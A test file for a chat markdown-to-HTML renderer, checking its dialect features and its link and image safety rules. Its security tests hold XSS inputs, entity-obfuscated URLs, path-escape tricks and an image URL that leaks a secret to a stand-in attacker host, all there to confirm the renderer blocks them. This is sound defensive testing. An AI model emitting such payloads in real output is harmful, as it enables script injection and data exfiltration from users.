import { describe, expect, it } from 'vitest';
import { richMarkdownToHtml } from './rich-markdown';

/**
 * The chat renderer's dialect parser. Kept in lockstep with
 * `@mantle/content`'s `markdownToDoc` (same dialect, different output: HTML for
 * the live TipTap editor vs ProseMirror JSON for page authoring). When you
 * change one, change both — these tests + markdown-to-doc.test.ts guard the
 * shared contract.
 */
describe('richMarkdownToHtml', () => {
  it('returns empty string for blank input', () => {
    expect(richMarkdownToHtml('')).toBe('');
    expect(richMarkdownToHtml('   \n  ')).toBe('');
  });

  it('renders standard markdown + highlight', () => {
    const html = richMarkdownToHtml('# Title\n\na **b** ==c==');
    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('<strong>b</strong>');
    expect(html).toContain('<mark>c</mark>');
  });

  it('renders [text]{color}/{highlight} as themed data-attr marks', () => {
    const html = richMarkdownToHtml(
      'a [b]{color=chart-2} c [d]{highlight=chart-4} e [f]{color=chart-1 highlight=chart-3}',
    );
    expect(html).toContain('<span data-text-color="chart-2">b</span>');
    expect(html).toContain('<mark data-color="chart-4">d</mark>');
    expect(html).toContain('data-text-color="chart-1"');
    expect(html).toContain('data-color="chart-3"');
    // Unknown token is left as plain text — no attr injection.
    expect(richMarkdownToHtml('x [y]{color=red}')).not.toContain('data-text-color');
  });

  it('renders callouts as data-callout with the variant', () => {
    expect(richMarkdownToHtml(':::warning\nbe careful\n:::')).toContain('data-variant="warning"');
    // unknown variant degrades to info
    expect(richMarkdownToHtml(':::bogus\nx\n:::')).toContain('data-variant="info"');
  });

  it('renders asides as data-aside with the themed colour', () => {
    const html = richMarkdownToHtml(':::aside chart-3\na side note\n:::');
    expect(html).toContain('data-aside');
    expect(html).toContain('data-color="chart-3"');
    expect(html).toContain('a side note');
    // No colour given → defaults to chart-1.
    expect(richMarkdownToHtml(':::aside\nx\n:::')).toContain('data-color="chart-1"');
  });

  it('renders a columns block as data-column-list with 2+ columns', () => {
    const html = richMarkdownToHtml(':::columns\nleft\n+++\nright\n:::');
    expect(html).toContain('data-column-list');
    expect((html.match(/data-column(?!-list)/g) ?? []).length).toBe(2);
  });

  it('degrades a single-column columns block to plain content', () => {
    const html = richMarkdownToHtml(':::columns\nonly one\n:::');
    expect(html).not.toContain('data-column-list');
    expect(html).toContain('only one');
  });

  it('renders GFM task lists as taskList markup with checked state', () => {
    const html = richMarkdownToHtml('- [x] done\n- [ ] todo');
    expect(html).toContain('data-type="taskList"');
    expect(html).toContain('data-checked="true"');
    expect(html).toContain('data-checked="false"');
  });

  it('renders fenced code with a language class lowlight can read', () => {
    expect(richMarkdownToHtml('```ts\nconst x = 1;\n```')).toContain('language-ts');
  });

  it('keeps a ```mermaid fence as a plain code block — chat never renders diagrams', () => {
    // Deliberate scope rule: the diagram node is a PAGES construct. The chat
    // surface shows the source as code, exactly like any other fence.
    const html = richMarkdownToHtml('```mermaid\nflowchart LR\n  A --> B\n```');
    expect(html).toContain('language-mermaid');
    expect(html).toContain('flowchart LR');
    expect(html).not.toContain('data-diagram');
  });

  it('renders GFM tables', () => {
    const html = richMarkdownToHtml('| A | B |\n|---|---|\n| 1 | 2 |');
    expect(html).toContain('<table>');
    expect(html).toContain('<th>A</th>');
  });

  it('renders markdown images as <img> the image node can parse', () => {
    expect(richMarkdownToHtml('![alt](https://x/y.png)')).toContain('<img src="https://x/y.png"');
  });

  describe('media: images (inline placement)', () => {
    it('resolves a standalone marker to the file-bytes route + data-node-id', () => {
      const html = richMarkdownToHtml('![Step 3: Add Measurement](media:f-1)');
      // PageImage.parseHTML is `img[src]`, so a real src is what makes this
      // parse as an image at all; data-node-id is what it re-derives from.
      expect(html).toContain('src="/api/files/files/f-1?raw=1"');
      expect(html).toContain('data-node-id="f-1"');
      expect(html).toContain('alt="Step 3: Add Measurement"');
      expect(html).not.toContain('src="media:');
    });

    it('places a marker written mid-prose, matching markdownToDoc', () => {
      // markdownToDoc lifts ANY image token out of its paragraph
      // (paragraphAndImages). The block-form-only rule is for media: LINKS,
      // not images. The chat converter emits the <img> in place and the shared
      // schema's block image node closes the paragraph around it.
      const html = richMarkdownToHtml('Open the form ![the form](media:f-2) and fill it in.');
      expect(html).toContain('data-node-id="f-2"');
      expect(html).toContain('Open the form');
      expect(html).toContain('and fill it in.');
    });

    it('renders several markers in written order', () => {
      const html = richMarkdownToHtml('1. one\n\n![a](media:f-1)\n\n2. two\n\n![b](media:f-2)');
      expect(html.indexOf('data-node-id="f-1"')).toBeLessThan(html.indexOf('data-node-id="f-2"'));
    });

    it('leaves a half-typed marker as literal text (streaming degrades quietly)', () => {
      // Every prefix a stream passes through on the way to a complete marker.
      for (const partial of [
        '!',
        '![',
        '![alt',
        '![alt]',
        '![alt](',
        '![alt](media:',
        '![alt](media:f-1',
      ]) {
        const html = richMarkdownToHtml(`Step one. ${partial}`);
        expect(html).not.toContain('<img');
        expect(html).not.toContain('data-node-id');
      }
    });

    it('never claims a stored file for a malformed or empty id', () => {
      // `media:` with nothing after it is not a file reference, so no
      // data-node-id is emitted and nothing is fetched from the files route.
      // It degrades to the same broken plain image markdownToDoc produces
      // (src `media:`, nodeId null); see the drift test's 'empty id' case.
      for (const src of ['![alt](media:)', '![alt](media: )']) {
        const html = richMarkdownToHtml(src);
        expect(html).not.toContain('data-node-id');
        expect(html).not.toContain('/api/files/files/');
      }
    });

    it('escapes the alt text so it cannot break out of the attribute', () => {
      const html = richMarkdownToHtml('![a"><script>x</script>](media:f-1)');
      expect(html).not.toContain('"><script>');
      expect(html).toContain('&quot;');
    });

    it('leaves an inline media: LINK as a plain link (only images place a picture)', () => {
      const html = richMarkdownToHtml('see [spec.pdf](media:f-2) here');
      expect(html).not.toContain('<img');
    });
  });

  it('renders $…$ / $$…$$ as KaTeX math spans/divs', () => {
    const inline = richMarkdownToHtml('Inline $E=mc^2$ here');
    expect(inline).toContain('data-type="inline-math"');
    expect(inline).toContain('data-latex="E=mc^2"');
    expect(richMarkdownToHtml('$$\nx^2\n$$')).toContain('data-type="block-math"');
  });
});

describe('links and pictures in a reply (W7f)', () => {
  it('keeps http(s), mailto and relative links for every login', () => {
    const html = richMarkdownToHtml(
      '[a](https://example.test/a) [b](mailto:b@example.test) [c](/n/abc) <https://example.test/auto>',
    );
    expect(html).toContain('href="https://example.test/a"');
    expect(html).toContain('href="mailto:b@example.test"');
    expect(html).toContain('href="/n/abc"');
    expect(html).toContain('href="https://example.test/auto"');
  });

  it('renders any other scheme as its text, for an Admin user too', () => {
    for (const adminUser of [true, false]) {
      const html = richMarkdownToHtml('[click](javascript:alert(1)) and [d](data:text/html,x)', {
        adminUser,
      });
      expect(html).not.toContain('href=');
      expect(html).not.toContain('javascript:');
      expect(html).toContain('click');
    }
  });

  it('an Admin user sees every picture', () => {
    const html = richMarkdownToHtml('![ext](https://x/y.png)\n\n![m](media:f-1)', {
      adminUser: true,
    });
    expect(html).toContain('<img src="https://x/y.png"');
    expect(html).toContain('data-node-id="f-1"');
  });

  it('anyone else: another origin, data: and malformed media: pictures read as their alt text', () => {
    const html = richMarkdownToHtml(
      [
        '![external chart](https://x/y.png)',
        '',
        '![inline data](data:image/png;base64,AAAA)',
        '',
        '![the gantry](media:f-1)',
        '',
        'Open ![the form](media:f-2) and ![a drawing](draw:d-1) here.',
      ].join('\n'),
      { adminUser: false },
    );
    expect(html).not.toContain('<img');
    for (const alt of ['external chart', 'inline data', 'the gantry', 'the form', 'a drawing']) {
      expect(html).toContain(alt);
    }
    // The standalone marker's alt sits in a paragraph, not loose.
    expect(html).toContain('<p>the gantry</p>');
  });

  it('anyone else: media: and draw: pictures of real ids show from the owner byte routes (W7e)', () => {
    const FILE = '0b6f2a52-3c1d-4e5f-8a9b-0c1d2e3f4a5b';
    const DRAW = '7d1e2f30-4a5b-4c6d-9e7f-8091a2b3c4d5';
    const html = richMarkdownToHtml(
      [`![the gantry](media:${FILE})`, '', `Open ![a drawing](draw:${DRAW}) here.`].join('\n'),
      { adminUser: false },
    );
    expect(html).toContain(`<img src="/api/files/files/${FILE}?raw=1" data-node-id="${FILE}"`);
    expect(html).toContain(`<img src="/api/draws/${DRAW}/svg?raw=1" data-draw-id="${DRAW}"`);
    // The same routes written as a plain URL picture show too.
    const url = richMarkdownToHtml(`![t](/api/files/files/${FILE}?thumb=1)`, { adminUser: false });
    expect(url).toContain(`<img src="/api/files/files/${FILE}?thumb=1"`);
  });

  it('a present: picture is the canvas snapshot, the image node draws its figure', () => {
    const CANVAS = '3f1c2b4a-0000-4000-8000-000000000001';
    for (const adminUser of [true, false]) {
      const html = richMarkdownToHtml(`See ![Pump deck](present:${CANVAS}) here.`, { adminUser });
      expect(html).toContain(
        `<img src="/api/presents/${CANVAS}/poster" data-present-id="${CANVAS}" alt="Pump deck">`,
      );
    }
  });

  it('anyone else: a same-origin picture off the owner routes still shows', () => {
    const html = richMarkdownToHtml('![logo](/brand/logo.png)', { adminUser: false });
    expect(html).toContain('<img src="/brand/logo.png"');
  });

  it('anyone else: raw HTML reads as text, so it cannot carry a picture or link', () => {
    const html = richMarkdownToHtml('hi <img src="https://x/y.png"> there', { adminUser: false });
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img');
    const block = richMarkdownToHtml('<div><a href="https://x">x</a></div>', { adminUser: false });
    expect(block).not.toContain('<a ');
    expect(block).not.toContain('<div>');
  });

  it('an entity cannot hide another origin or scheme from the markdown pass', () => {
    const html = richMarkdownToHtml(
      [
        '![i](&#104;ttps://evil.example.test/p.png?d=SECRET)',
        '',
        '![j](&#47;&#47;evil.example.test/x.png)',
        '',
        '[a](&#106;avascript:alert(1))',
      ].join('\n'),
      { adminUser: false },
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('<a ');
    expect(html).not.toContain('href=');
    expect(html).not.toContain('evil.example.test');
    // The link's scheme is refused for an Admin user too.
    const admin = richMarkdownToHtml('[a](&#106;avascript:alert(1))', { adminUser: true });
    expect(admin).not.toContain('<a ');
    expect(admin).not.toContain('href=');
  });

  it('a dot segment or an escape cannot reach an owner byte route', () => {
    const html = richMarkdownToHtml('![x](/a/../api/files/x) ![y](/api/%66iles/x)', {
      adminUser: false,
    });
    expect(html).not.toContain('<img');
  });

  it('an alt that looks like markup stays text', () => {
    const html = richMarkdownToHtml('![<b>x</b>](https://x/y.png)', { adminUser: false });
    expect(html).not.toContain('<b>');
    expect(html).toContain('&lt;b&gt;');
  });
});
